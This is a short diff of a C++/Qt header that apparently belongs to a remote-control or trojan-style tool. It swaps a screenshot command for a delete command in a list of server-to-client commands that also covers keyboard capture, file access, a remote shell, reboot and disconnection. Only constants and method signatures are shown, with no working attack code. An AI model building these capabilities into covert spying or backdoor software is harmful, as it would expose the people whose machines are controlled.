@@ -20,7 +20,7 @@ public:
 
     //-------------------------------------------------------------------------------
     // 服务端向客户端发送的指令
-    const QByteArray CmdSnapshoot = "CMD_SNAPSHOOT";
+    const QByteArray CmdDelete = "CMD_DELETE";
     const QByteArray CmdKeybd = "CMD_KEYBD";
     const QByteArray CmdFile = "CMD_FILE";
     const QByteArray CmdShell = "CMD_SHELL";
@@ -51,7 +51,7 @@ public:
     void sendCmdSendBox(QString &text);
     void sendCmdReboot();
     void sendCmdOffline();
-    void sendCmdSnapshoot(int port);
+    void sendCmdDelete();
     void sendCmdKeybd(int port);
     void sendCmdFile(int port);
     void sendCmdShell(int port);
